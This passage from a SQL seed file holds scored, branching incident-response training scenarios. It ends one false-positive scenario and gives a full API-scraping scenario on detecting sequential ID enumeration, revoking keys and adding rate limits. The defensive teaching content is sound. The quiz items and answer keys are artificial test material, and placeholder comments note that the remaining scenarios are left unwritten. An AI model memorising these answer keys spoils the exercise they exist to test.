      {"id": "test_monitor", "text": "Test checkout personally (mobile + desktop) + monitor support tickets + watch revenue metric", "score": 100, "feedback": "Excellent! Verify fix works and monitor for continued issues.", "next": null, "outcome": "success"},
      {"id": "assume_fixed", "text": "Assume it''s fixed and move on", "score": 20, "feedback": "Risky - always verify fixes work. Check tickets decrease and revenue recovers.", "next": null, "outcome": "partial"},
      {"id": "wait_tickets", "text": "Wait for support tickets to decrease", "score": 40, "feedback": "Passive - test proactively to confirm fix works immediately.", "next": null, "outcome": "partial"}
    ]
  }
]',
'["analyze_logs", "exception", "test_monitor"]',
'["Identify false positive patterns", "Create specific exceptions", "Test fixes thoroughly", "Balance security and UX"]',
10, 3),

-- Continue with 7 more incidents...
-- (For brevity, I'll add a few more key scenarios)

-- Incident 4: API Scraping
('API Scraping / Data Exfiltration', 'api-scraping-01', 'api_abuse', 'advanced',
'Single API key is making 10,000 req/min to /api/products, sequentially enumerating all product IDs. Database load spiking.',
'{"time": "02:30 AM", "metrics": {"api_requests_per_min": 10000, "normal_baseline": 100, "database_cpu": 85, "api_key": "key_abc123", "pattern": "sequential_id_enumeration"}, "alerts": ["API: Unusual traffic pattern", "Database: High load on products table", "Pattern: /api/products/1, /api/products/2, /api/products/3..."], "context": "API key belongs to legitimate partner who typically makes 100-500 req/min."}',
'[
  {
    "id": "identify",
    "question": "How do you confirm this is abuse vs legitimate usage?",
    "options": [
      {"id": "check_pattern", "text": "Check: Request rate (10,000 vs normal 100), pattern (sequential IDs), time (2:30 AM unusual), volume (all products)", "score": 100, "feedback": "Correct! Clear abuse: extreme rate, sequential enumeration, off-hours, bulk extraction.", "next": "contain"},
      {"id": "call_partner", "text": "Call partner to ask if legitimate", "score": 40, "feedback": "Good idea but takes time. Contain first to stop damage, then investigate.", "next": "contain"}
    ]
  },
  {
    "id": "contain",
    "question": "Confirmed abuse. Immediate action?",
    "options": [
      {"id": "revoke_key", "text": "Revoke API key + implement endpoint rate limit (100 req/min)", "score": 100, "feedback": "Perfect! Stop the immediate abuse and prevent recurrence.", "next": "prevent"},
      {"id": "rate_limit_only", "text": "Just add rate limiting", "score": 60, "feedback": "Helps but key is still valid - attacker can continue at slower rate.", "next": "prevent"},
      {"id": "block_ip", "text": "Block source IP", "score": 40, "feedback": "Works temporarily but attacker can rotate IPs. Revoke key instead.", "next": "prevent"}
    ]
  },
  {
    "id": "prevent",
    "question": "For long-term prevention, what do you implement?",
    "options": [
      {"id": "uuid_paginate", "text": "Use UUIDs instead of sequential IDs + pagination limits (max 100 per request) + monitoring", "score": 100, "feedback": "Excellent! UUIDs prevent enumeration, pagination limits bulk extraction, monitoring detects abuse.", "next": null, "outcome": "success"},
      {"id": "captcha", "text": "Add CAPTCHA to API", "score": 20, "feedback": "Not practical for APIs - breaks automation. Use rate limiting + UUIDs.", "next": null, "outcome": "partial"},
      {"id": "nothing", "text": "Issue resolved, no changes needed", "score": 0, "feedback": "Dangerous - without fixes, abuse will recur with new key or different attacker.", "next": null, "outcome": "failure"}
    ]
  }
]',
'["check_pattern", "revoke_key", "uuid_paginate"]',
'["Detect API abuse patterns", "Revoke compromised credentials", "Prevent enumeration with UUIDs", "Implement pagination limits"]',
15, 3);


-- Note: Additional 6 incident scenarios would follow the same pattern
-- covering cache poisoning, origin failure, traffic spike analysis, bot bypass, etc.
-- For the complete application, expand to 10 total scenarios

